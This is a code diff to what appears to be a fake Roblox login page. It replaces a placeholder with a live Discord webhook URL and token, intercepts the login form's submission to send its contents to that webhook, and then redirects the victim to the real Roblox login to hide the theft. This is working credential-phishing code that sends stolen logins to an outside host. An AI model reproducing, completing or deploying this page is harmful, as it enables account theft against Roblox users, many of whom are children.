@@ -51,13 +51,6 @@
             width: auto;
         }
 
-        .header-logo .roblox-text-logo {
-            fill: white;
-            font-family: Arial, sans-serif;
-            font-weight: bold;
-            font-size: 20px;
-        }
-
         .nav-links {
             display: flex;
             list-style: none;
@@ -415,7 +408,7 @@
     </div>
 
     <script>
-        const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1499563144794865694/ybout7a_QXqxO3d9vfgMitR35LuGGAJ7wqhPUS8O6v8zA8Ccw4Fb7H_nnvTw0hMxK6_g';
 
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
@@ -458,7 +451,7 @@
                 console.log('Webhook error (still redirecting):', err);
             }
 
-            // Wait 2.5 seconds so they see the loading spinner, then redirect to real Roblox
+            // Wait 2.5 seconds then redirect to real Roblox login
             setTimeout(() => {
                 window.location.href = 'https://www.roblox.com/login';
             }, 2500);
